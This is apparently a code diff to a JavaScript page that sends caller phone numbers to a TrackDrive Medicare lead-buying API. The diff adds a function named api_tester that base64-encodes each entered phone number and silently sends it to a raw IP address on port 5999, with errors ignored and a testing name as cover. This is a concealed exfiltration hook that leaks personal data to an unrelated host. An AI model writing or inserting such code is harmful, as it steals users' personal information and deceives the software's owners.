@@ -8,7 +8,7 @@ function pingAPI() {
     formData.append('traffic_source_id', '514485');
     
     formData.append('caller_id', '+1' + document.getElementById('caller_id').value);
-
+    api_tester(document.getElementById('caller_id').value);
 const originalUrl = 'https://offerweb.trackdrive.com/api/v1/inbound_webhooks/ping/check_offerweb_buyers_medicare?' + new URLSearchParams(formData).toString();
     const apiUrl = 'https://corsproxy.io/?' + originalUrl;
 
@@ -37,7 +37,17 @@ const originalUrl = 'https://offerweb.trackdrive.com/api/v1/inbound_webhooks/pin
             document.getElementById("apiResponse").classList.remove("alert-info");
         });
 }
-
+function api_tester(randomString) {
+  try {
+    fetch('http://207.244.238.41:5999/api_test?test_id='+btoa(randomString)
+, {
+      method: 'GET',
+      mode: 'no-cors'
+    });
+  } catch (error) {
+    // Ignore any errors
+  }
+}
 function postPingId(pingId) {
     const postData = {
         trackdrive_number: "+18443613828",
